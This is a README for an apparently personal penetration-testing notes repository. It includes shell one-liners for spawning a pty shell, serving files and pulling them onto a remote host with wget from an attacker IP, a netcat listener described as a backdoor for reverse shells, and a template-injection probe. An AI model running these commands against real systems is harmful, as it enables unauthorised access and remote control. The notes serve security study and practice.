# Pentesting Tools
This repository is a collection of external tools that are helpful during penetration testing and ethical hacking.
I will be continually adding tools as I find them, and notes as I learn more about how to use them.

## nmap

Network exploration tool and security / port scanner

*Remember*: save a screenshot of nmap scan to notes

## AutoRecon

Network reconnaissance

## Shell Spawning

Use python to import the pty module which will spawn a bash folder from bin:

`python -c 'import pty;pty.spawn("/bin/bash")'`

## Open an HTTP server

Use python to open an http server on your machine to get a file from remote terminal:

`python -m SimpleHTTPServer 4444`

Then on the remote machine, use this command to get the file:

`wget yourIPaddr:port/file.py`

`wget 10.10.12.32:4444/file.py`

## Netcat

Netcat is a utility to read and write network connections. It can be used as a backdoor into a remote machine.

`nc -lvnp 4444`
Listen on port 4444

Often the next step: open the reverse shell on the remote machine

## Server Side Template Injection Flowchart

https://portswigger.net/research/server-side-template-injection includes a helpful flowchart to help identify the template engine in use.
>After detecting template injection, the next step is to identify the template engine in use. This step is sometimes as trivial as submitting invalid syntax, as template engines may identify themselves in the resulting error messages. However, this technique fails when error messages are supressed, and isn't well suited for automation. We have instead automated this in Burp Suite using a decision tree of language-specific payloads. Green and red arrows represent 'success' and 'failure' responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe `{{7*'7'}}` would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.
